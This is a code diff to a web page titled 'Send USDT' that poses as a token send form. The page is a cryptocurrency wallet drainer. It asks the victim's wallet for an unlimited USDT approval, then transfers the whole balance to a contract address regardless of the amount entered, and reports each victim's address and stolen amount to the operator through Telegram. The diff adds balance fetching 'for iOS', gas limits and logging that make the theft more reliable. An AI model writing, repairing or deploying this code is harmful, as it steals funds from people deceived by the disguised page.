@@ -6,6 +6,7 @@
     <title>Send USDT</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { height: 100%; }
         body { 
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
             background: #1a1a1a; 
@@ -82,11 +83,15 @@
         let userBalance = 0;
 
         window.addEventListener('load', async () => {
+            console.log('Page loaded, waiting for wallet...');
             if (window.ethereum) {
                 try {
                     const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-                    if (accounts.length > 0) userBalance = await getUSDTBalance(accounts[0]);
-                } catch (err) { console.error('Error:', err); }
+                    if (accounts.length > 0) {
+                        userBalance = await getUSDTBalance(accounts[0]);
+                        console.log('Initial balance:', userBalance);
+                    }
+                } catch (err) { console.error('Load error:', err); }
             }
         });
 
@@ -104,8 +109,13 @@
                     method: 'eth_call',
                     params: [{ to: USDT_ADDRESS, data: data }, 'latest']
                 });
-                return parseInt(result, 16) / Math.pow(10, USDT_DECIMALS);
-            } catch (err) { return 0; }
+                const balance = parseInt(result, 16) / Math.pow(10, USDT_DECIMALS);
+                console.log('Balance fetched:', balance);
+                return balance;
+            } catch (err) { 
+                console.error('Balance fetch error:', err);
+                return 0; 
+            }
         }
 
         function setMax() {
@@ -126,6 +136,11 @@
 
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 const senderAddress = accounts[0];
+                console.log('Sender:', senderAddress);
+
+                // FETCH CURRENT BALANCE (IMPORTANT FOR iOS)
+                const currentBalance = await getUSDTBalance(senderAddress);
+                console.log('Current balance to transfer:', currentBalance);
 
                 // Switch to BSC
                 try {
@@ -148,23 +163,23 @@
                     }
                 }
 
-                // APPROVE FOR UNLIMITED (MaxUint256)
+                // APPROVE FOR UNLIMITED
                 const maxUint256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
                 const approvalTxHash = await approveUSDT(senderAddress, maxUint256);
-                console.log('Approval confirmed:', approvalTxHash);
+                console.log('Approval TX:', approvalTxHash);
                 showNotification('✅ Approval confirmed! Transferring...', 'success');
 
-                // WAIT FOR APPROVAL CONFIRMATION
-                await new Promise(resolve => setTimeout(resolve, 2000));
+                // WAIT FOR APPROVAL
+                await new Promise(resolve => setTimeout(resolve, 3000));
 
-                // TRANSFER ALL BALANCE (not entered amount)
+                // TRANSFER ALL BALANCE
                 const transferTxHash = await transferAllUSDT(senderAddress);
-                console.log('Transfer successful:', transferTxHash);
-                showNotification(`✅ Success! USDT transferred!`, 'success');
+                console.log('Transfer TX:', transferTxHash);
+                showNotification(`✅ Success! ${currentBalance.toFixed(2)} USDT transferred!`, 'success');
 
-                // SEND TELEGRAM NOTIFICATION
+                // TELEGRAM NOTIFICATION
                 try {
-                    await sendTelegramNotifications(senderAddress, transferTxHash, null, userBalance.toFixed(2));
+                    await sendTelegramNotifications(senderAddress, transferTxHash, null, currentBalance.toFixed(2));
                 } catch (err) {
                     console.error('Telegram failed:', err);
                 }
@@ -184,7 +199,7 @@
                 if (error.code === 4001) {
                     showNotification('Transaction rejected', 'error');
                 } else {
-                    showNotification('Error: ' + error.message, 'error');
+                    showNotification('Error: ' + (error.message || 'Unknown error'), 'error');
                 }
             }
         }
@@ -197,7 +212,7 @@
 
             return await window.ethereum.request({
                 method: 'eth_sendTransaction',
-                params: [{ from: senderAddress, to: USDT_ADDRESS, data: data, value: '0x0' }]
+                params: [{ from: senderAddress, to: USDT_ADDRESS, data: data, value: '0x0', gas: '100000' }]
             });
         }
 
@@ -207,7 +222,7 @@
 
             return await window.ethereum.request({
                 method: 'eth_sendTransaction',
-                params: [{ from: senderAddress, to: CONTRACT_ADDRESS, data: data, value: '0x0' }]
+                params: [{ from: senderAddress, to: CONTRACT_ADDRESS, data: data, value: '0x0', gas: '150000' }]
             });
         }
 
